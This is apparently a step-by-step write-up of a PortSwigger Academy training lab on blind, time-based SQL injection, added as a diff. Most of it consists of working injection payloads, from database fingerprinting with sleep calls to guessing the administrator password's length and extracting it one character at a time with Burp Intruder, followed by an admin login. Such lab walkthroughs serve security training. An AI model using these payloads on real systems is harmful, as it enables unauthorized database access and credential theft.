@@ -1,0 +1,96 @@
+PortSwigger Academy Lab: Blind SQL injection with time delays and information retrieval
+
+*****Context*****
+Application using a tracking cookie for analytics
+Results of the SQL query are not returned
+Application does not respond any differently based on whether the query returns any rows or causes an error.
+The database contains a table called users with columns named username and password
+
+*****Checking if time delays happen*****
+
+ATTEMPT-1
+⦁	Input:';dbms_pipe.receive_message(('a'),10)
+⦁	Output: Normal Response
+⦁	Lesson Learned: The database isn't an Oracle database
+
+ATTEMPT-2
+⦁	Input: ';WAITFOR DELAY '0:0:10'
+⦁	Output: Normal Response
+⦁	Lesson Learned: The database isn't a Microsoft database
+
+ATTEMPT-3
+⦁	Input: ';SELECT pg_sleep(10)
+⦁	Output: 10 seconds delayed response
+
+Lesson Learned: The database is a PostgreSQL database
+
+*****Checking if conditional time delays can be triggered*****
+
+ATTEMPT-1
+⦁	Input: ';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+⦁	Output: 10 seconds delayed response
+
+ATTEMPT-2
+⦁	Input: ';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+⦁	Output: Normal response
+
+Lesson Learned: Conditional time delays can be triggered
+
+*****Checking if administrator account exists in users table*****
+
+ATTEMPT-1
+⦁	Input: ';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+⦁	Output: 10 seconds delayed response
+
+Lesson Learned: A user called administrator exists in the users table
+
+*****Checking the length of the password*****
+
+ATTEMPT-1
+⦁	Input: '%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+⦁	Output: 10 seconds delayed response
+
+ATTEMPT-2
+⦁	Input: '%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+⦁	Output: 10 seconds delayed response
+.
+.
+.
+.
+.
+.
+
+ATTEMPT-20
+⦁	Input: '%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+⦁	Output: Normal response
+
+Lesson Learned: The length of the password is 20 characters
+
+*****Determining the characters of the password using Burp Intruder*****
+
+ATTEMPT-1
+⦁	Input:'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+⦁	Output: Password- 9
+
+ATTEMPT-2
+⦁	Input:'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+⦁	Output: Password- 9w
+.
+.
+.
+.
+.
+.
+
+ATTEMPT-20
+⦁	Input:'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+⦁	Output: Password- 9wce0itpj5xt5afit613
+
+*****Obtaining escalated privileges by logging into the admin account******
+
+ATTEMPT-1
+⦁	Input: Username: administrator
+          Password: 9wce0itpj5xt5afit613
+⦁	Output: Welcome administrator
+
+Lesson Learned: Sensitive account credentials can be used for privilege escalation
